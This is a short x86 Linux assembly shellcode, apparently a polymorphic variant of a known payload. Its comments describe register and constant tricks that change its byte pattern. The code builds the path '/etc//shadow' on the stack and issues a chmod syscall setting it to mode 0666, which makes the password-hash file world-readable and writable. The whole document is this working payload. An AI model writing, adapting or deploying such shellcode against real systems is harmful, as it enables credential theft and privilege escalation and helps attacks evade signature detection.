global _start


section .text

_start:

	xor ecx, ecx			; clearing a different register at the start
	mul ecx				; this clears both EAX and EDX
	push edx			; finally get back around to pushing our null onto the stack but with a 2nd new register
	push dword 0x776f6461
	push dword 0x68732f2f
	push dword 0x6374652f
	mov edi,esp			; save stack pointer in different register
	xchg ebx, edi			; put stack pointer back into EBX
	push word 0x1ff			; push '777' instead of '666' (this is in octal)
	pop ecx
	sub ecx, 0x49			; get ECX back down to '666' by subtracting '111'
	mov al,0xf
	int 0x80
	mov al,0x1
	int 0x80
